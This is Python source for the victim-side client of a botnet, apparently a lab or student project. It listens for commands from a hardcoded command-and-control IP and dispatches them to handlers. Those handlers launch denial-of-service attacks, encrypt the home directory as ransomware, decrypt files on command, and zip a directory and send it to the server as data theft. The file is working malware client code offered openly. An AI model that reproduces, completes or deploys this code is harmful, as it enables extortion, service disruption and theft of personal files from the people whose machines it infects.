import socket
import logging
import threading
import os
import zipfile
from messenger import *
from encryption import *
from dos import *
from os.path import expanduser
from time import sleep

PORT = 3838
VICTIM_LISTEN_PORT = 4848
# SERVER_IP = "10.195.114.134"
# Server will have a static IP
SERVER_IP = "10.195.243.246"


class Victim(object):

    def __init__(self):
        self.ip = get_ip()

    def send_message(self, msg):
        str_msg = str(msg)
        print ("Sending %s to Server") % str_msg
        Messenger.send_message(self.ip, PORT, str_msg)

    def receive_message(self, msg):
        print "Got %s" % msg
        return

    def process_decrypt_files(self, msg):
        print "Decrypting files..."
        decrypt_home(msg[0])
        return

    def process_dos_attack(self, msg):
        print "Target for dos attack %s" % str(msg[0])
        dos(msg[0], msg[1])
        return

    def process_encrypt_files(self, msg):
        print "Encrypting files..."
        encrypt_home(msg[0])
        return

    def process_new_victim(self, msg):
        # The server should have list of all infected machines
        # Add to that list
        Messenger.send_message(SERVER_IP, PORT, "JOIN,")
        return

    def process_send_dir(self, msg):
        # This will send the infected computer's entire home dir
        # NEED to remove the hard coded directories and replace with home
        print "Server has requested the home directory"
        home = expanduser("~")
        print "home dir is %s" % str(home)
        zip_name = str(self.ip) + "home_dir.zip"
        print "zip_name is %s" % str(zip_name)
        zipf = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
        zipdir('/Users/MaherSamawi/test_zip', zipf)
        zipf.close()
        print "Sending it over"
        with open(zip_name, "r") as f:
            data = f.read()
            msg_contents = "D," + str(data)
            Messenger.send_message(SERVER_IP, PORT, msg_contents)
        os.remove(zip_name)

    def processing_thread(self):
        # Get a message
        # Call the appropriate handler
        s = Messenger.set_up_listening_socket(VICTIM_LISTEN_PORT)
        while True:
            data, victim = s.recvfrom(8192)
            print "Response from Server: %s" % (str(victim[0]))
            M_type = Messenger.get_msg_type(data)
            self.MSG_COMMANDS[M_type](self, Messenger.strip_msg(data))
        s.close()

    # MSG DICT
    MSG_COMMANDS = {
        'JOIN': process_new_victim,
        'DOS': process_dos_attack,
        'RANSOMEWARE': process_encrypt_files,
        'DECRYPT': process_decrypt_files,
        'STEAL': process_send_dir
    }


def zipdir(path, ziph):
    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))


# Get the IP_address
# Was getting errors from the other way
def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    # Returns tuple of ip and port
    return s.getsockname()[0]
